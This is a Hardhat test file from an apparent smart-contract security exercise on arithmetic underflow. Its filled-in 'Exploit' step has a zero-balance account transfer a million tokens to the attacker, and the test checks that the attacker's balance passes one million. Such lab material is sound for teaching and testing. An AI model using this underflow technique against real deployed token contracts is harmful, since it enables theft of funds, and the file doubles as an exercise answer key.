import { ethers } from 'hardhat';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { BigNumber } from 'ethers';
import { parseEther } from 'ethers/lib/utils';
import { expect } from 'chai';
import { SimpleToken, SimpleToken__factory } from '../../typechain-types';

describe('Arithmetic Over/Underflow Exercise 2', function () {
	let deployer: SignerWithAddress, attacker: SignerWithAddress, user1: SignerWithAddress;

	const ATTACKER1_MINT = parseEther('10');
	const DEPLOYER_MINT = parseEther('100000');

	let token: SimpleToken;

	before(async function () {
		/** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

		[deployer, attacker, user1] = await ethers.getSigners();

		// Deploy
		const tokenFactory = (await ethers.getContractFactory(
			'contracts/arithmetic-overflows-2/SimpleToken.sol:SimpleToken',
			deployer
		)) as SimpleToken__factory;
		token = await tokenFactory.deploy();

		await token.mint(deployer.address, DEPLOYER_MINT);
		await token.mint(attacker.address, ATTACKER1_MINT);
	});

	it('Exploit', async function () {
		/** CODE YOUR SOLUTION HERE */
		const MIL_TOKENS = parseEther('1000000');

		await token.connect(user1).transfer(attacker.address, MIL_TOKENS);
	});

	after(async function () {
		/** SUCCESS CONDITIONS */
		// Attacker should have a lot of tokens (at least more than 1 million)
		expect(await token.getBalance(attacker.address)).to.be.gt(parseEther('1000000'));
	});
});
